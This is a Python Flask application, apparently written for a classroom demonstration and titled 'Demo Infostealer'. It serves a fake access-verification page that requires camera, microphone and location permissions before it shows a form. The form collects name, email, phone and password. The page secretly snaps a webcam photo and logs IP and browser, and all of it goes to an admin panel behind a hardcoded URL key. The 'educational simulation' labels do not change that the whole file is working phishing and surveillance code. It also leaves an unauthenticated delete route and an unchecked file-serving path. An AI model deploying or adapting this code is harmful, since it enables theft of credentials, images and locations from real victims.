from flask import Flask, request, render_template_string, redirect, url_for, jsonify
from datetime import datetime
import json
import os
import base64
import uuid

app = Flask(__name__)

DATA_FILE = "datos_recolectados.json"
ADMIN_KEY = "miclase2026"
IMAGES_FOLDER = "capturas"
os.makedirs(IMAGES_FOLDER, exist_ok=True)

# Página principal con bloqueo de envío hasta tener permisos + captura de foto
LANDING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Demo Infostealer - Acceso al sistema</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e1a;
            color: #00ffcc;
            text-align: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: rgba(0,0,0,0.8);
            padding: 20px;
            border-radius: 10px;
        }
        h1 { font-size: 1.8em; }
        input, button {
            width: 90%;
            padding: 12px;
            margin: 8px 0;
            border-radius: 5px;
            border: none;
            font-size: 1em;
        }
        input {
            background: #1e2a3a;
            color: white;
        }
        button {
            background: #00ffcc;
            color: #0a0e1a;
            font-weight: bold;
            cursor: pointer;
        }
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        .status {
            margin-top: 20px;
            font-size: 0.9em;
            color: #ffaa00;
        }
        .small {
            font-size: 0.8em;
            color: #888;
        }
        video {
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
            display: none;
            border: 2px solid #00ffcc;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 VERIFICACIÓN DE ACCESO</h1>
        <p>Para continuar, primero otorgue los permisos solicitados.</p>

        <button id="btnCamara">🎥 Habilitar cámara y micrófono</button>
        <button id="btnGeo">📍 Compartir ubicación</button>

        <div id="estadoPermisos" class="status"></div>

        <div style="margin-top: 20px; display: none;" id="formularioDiv">
            <form id="dataForm">
                <input type="text" id="nombre" placeholder="Nombre completo" required>
                <input type="email" id="correo" placeholder="Correo electrónico" required>
                <input type="tel" id="telefono" placeholder="Número de teléfono" required>
                <input type="password" id="contrasena" placeholder="Contraseña (solo para simulación)">
                <button type="submit" id="btnEnviar">📩 Enviar datos y activar cámara</button>
            </form>
        </div>

        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <div id="estado" class="status"></div>
        <p class="small">Simulación educativa controlada. Los datos se borrarán al final.</p>
    </div>

    <script>
        let stream = null;
        let ubicacionConcedida = false;
        let camaraConcedida = false;
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const estadoDiv = document.getElementById('estado');
        const estadoPermisos = document.getElementById('estadoPermisos');

        function verificarHabilitarFormulario() {
            if (camaraConcedida && ubicacionConcedida) {
                document.getElementById('formularioDiv').style.display = 'block';
                estadoPermisos.innerHTML = '✅ Permisos concedidos. Complete el formulario.';
            }
        }

        // Cámara
        document.getElementById('btnCamara').addEventListener('click', async () => {
            estadoPermisos.innerHTML = 'Solicitando cámara y micrófono...';
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                video.style.display = 'block';
                video.srcObject = stream;
                camaraConcedida = true;
                estadoPermisos.innerHTML = '✅ Cámara y micrófono activados.';
                await fetch('/registrar_permiso_camara', { method: 'POST' });
                verificarHabilitarFormulario();
            } catch (err) {
                estadoPermisos.innerHTML = '❌ Permiso de cámara denegado: ' + err.message;
                await fetch('/registrar_permiso_camara_denegado', { method: 'POST' });
            }
        });

        // Geolocalización
        document.getElementById('btnGeo').addEventListener('click', () => {
            if (!navigator.geolocation) {
                estadoPermisos.innerHTML = '❌ Geolocalización no soportada.';
                return;
            }
            estadoPermisos.innerHTML = 'Obteniendo ubicación...';
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;
                ubicacionConcedida = true;
                estadoPermisos.innerHTML = `📍 Ubicación compartida: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`;
                await fetch('/registrar_geo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat: latitude, lon: longitude })
                });
                verificarHabilitarFormulario();
            }, async (err) => {
                estadoPermisos.innerHTML = '❌ Ubicación denegada: ' + err.message;
                await fetch('/registrar_geo_denegado', { method: 'POST' });
            });
        });

        // Envío de formulario + captura de foto
        document.getElementById('dataForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!camaraConcedida || !ubicacionConcedida) {
                alert('Primero debe conceder permisos de cámara y ubicación.');
                return;
            }

            // Tomar foto
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const fotoBase64 = canvas.toDataURL('image/jpeg');

            // Recolectar datos del formulario
            const nombre = document.getElementById('nombre').value;
            const correo = document.getElementById('correo').value;
            const telefono = document.getElementById('telefono').value;
            const contrasena = document.getElementById('contrasena').value;

            if (!nombre || !correo || !telefono) {
                estadoDiv.innerHTML = '❌ Complete nombre, correo y teléfono.';
                return;
            }

            estadoDiv.innerHTML = 'Enviando datos y foto...';
            const response = await fetch('/enviar_datos', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ nombre, correo, telefono, contrasena, foto: fotoBase64 })
            });

            if (response.ok) {
                estadoDiv.innerHTML = '✅ Datos enviados. Redirigiendo...';
                // Detener stream
                if (stream) stream.getTracks().forEach(track => track.stop());
                window.location.href = '/gracias';
            } else {
                estadoDiv.innerHTML = '❌ Error al enviar.';
            }
        });
    </script>
</body>
</html>
"""

# Página de agradecimiento después del envío
GRACIAS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Gracias</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e1a;
            color: #00ffcc;
            text-align: center;
            margin-top: 20%;
        }
        h1 { font-size: 2.5em; }
    </style>
</head>
<body>
    <h1>✅ Gracias por registrarte</h1>
    <p>Te enviaremos un correo con el enlace de conexión a la presentación.</p>
    <p><small>Esta es una simulación educativa. No se enviará ningún correo real.</small></p>
</body>
</html>
"""

@app.route('/')
def index():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    datos = []
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)

    nuevo_registro = {
        "id": str(uuid.uuid4()),
        "hora": hora,
        "ip": ip,
        "navegador": user_agent[:200],
        "nombre": "",
        "correo": "",
        "telefono": "",
        "contrasena": "",
        "permiso_camara": "Pendiente",
        "geolocalizacion": "",
        "foto": ""  # Ruta de la imagen guardada
    }
    datos.append(nuevo_registro)

    with open(DATA_FILE, "w") as f:
        json.dump(datos, f, indent=4)

    return LANDING_PAGE

@app.route('/gracias')
def gracias():
    return GRACIAS_PAGE

@app.route('/enviar_datos', methods=['POST'])
def enviar_datos():
    data = request.get_json()
    ip = request.remote_addr
    nombre = data.get("nombre", "")
    correo = data.get("correo", "")
    telefono = data.get("telefono", "")
    contrasena = data.get("contrasena", "")
    foto_base64 = data.get("foto", "")

    # Guardar foto en disco
    foto_filename = None
    if foto_base64 and foto_base64.startswith('data:image'):
        # Extraer base64
        img_data = foto_base64.split(',')[1]
        foto_filename = f"{uuid.uuid4().hex}.jpg"
        foto_path = os.path.join(IMAGES_FOLDER, foto_filename)
        with open(foto_path, "wb") as f:
            f.write(base64.b64decode(img_data))

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["nombre"] = nombre
                registro["correo"] = correo
                registro["telefono"] = telefono
                registro["contrasena"] = contrasena
                registro["foto"] = foto_filename if foto_filename else ""
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return jsonify({"status": "ok"})

@app.route('/registrar_permiso_camara', methods=['POST'])
def registrar_permiso_camara():
    ip = request.remote_addr
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["permiso_camara"] = "Concedido"
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/registrar_permiso_camara_denegado', methods=['POST'])
def registrar_permiso_camara_denegado():
    ip = request.remote_addr
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["permiso_camara"] = "Denegado"
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/registrar_geo', methods=['POST'])
def registrar_geo():
    data = request.get_json()
    ip = request.remote_addr
    geo_str = f"{data.get('lat', '')}, {data.get('lon', '')}"
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["geolocalizacion"] = geo_str
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/registrar_geo_denegado', methods=['POST'])
def registrar_geo_denegado():
    ip = request.remote_addr
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            datos = json.load(f)
        for registro in reversed(datos):
            if registro["ip"] == ip:
                registro["geolocalizacion"] = "Denegado"
                break
        with open(DATA_FILE, "w") as f:
            json.dump(datos, f, indent=4)
    return "OK", 200

@app.route('/admin/<clave>')
def admin(clave):
    if clave != ADMIN_KEY:
        return "Acceso denegado", 403
    if not os.path.exists(DATA_FILE):
        return "<h3>No hay datos aún.</h3>"
    with open(DATA_FILE, "r") as f:
        datos = json.load(f)

    html = "<h2>📦 Datos capturados con foto incluida</h2>"
    html += "<table border='1' cellpadding='5' style='border-collapse: collapse; font-size: 12px;'>"
    html += "<tr><th>Hora</th><th>IP</th><th>Navegador</th><th>Nombre</th><th>Correo</th><th>Teléfono</th><th>Contraseña</th><th>Permiso Cámara</th><th>Geolocalización</th><th>Foto</th></tr>"
    for d in datos:
        foto_html = ""
        if d.get("foto") and os.path.exists(os.path.join(IMAGES_FOLDER, d["foto"])):
            foto_html = f"<img src='/foto/{d['foto']}' width='80' height='60' style='object-fit:cover;'>"
        else:
            foto_html = "No"
        html += f"<tr><td>{d['hora']}</td><td>{d['ip']}</td><td>{d['navegador'][:50]}</td><td>{d.get('nombre','')}</td><td>{d.get('correo','')}</td><td>{d.get('telefono','')}</td><td>{d.get('contrasena','')}</td><td>{d.get('permiso_camara','')}</td><td>{d.get('geolocalizacion','')}</td><td>{foto_html}</td></tr>"
    html += "</table><br>"
    html += "<p><a href='/borrar_datos' onclick='return confirm(\"¿Borrar todos los datos y fotos?\")'>🗑️ Borrar todos los datos (transparencia)</a></p>"
    return html

@app.route('/foto/<filename>')
def foto(filename):
    from flask import send_file
    return send_file(os.path.join(IMAGES_FOLDER, filename), mimetype='image/jpeg')

@app.route('/borrar_datos')
def borrar_datos():
    if os.path.exists(DATA_FILE):
        os.remove(DATA_FILE)
    # Borrar también todas las fotos
    for f in os.listdir(IMAGES_FOLDER):
        os.remove(os.path.join(IMAGES_FOLDER, f))
    return "<h3>✅ Todos los datos y fotos han sido eliminados.</h3><p><a href='/'>Volver</a></p>"

if __name__ == '__main__':
    if os.path.exists(DATA_FILE):
        os.remove(DATA_FILE)
    app.run(host='0.0.0.0', port=5000)
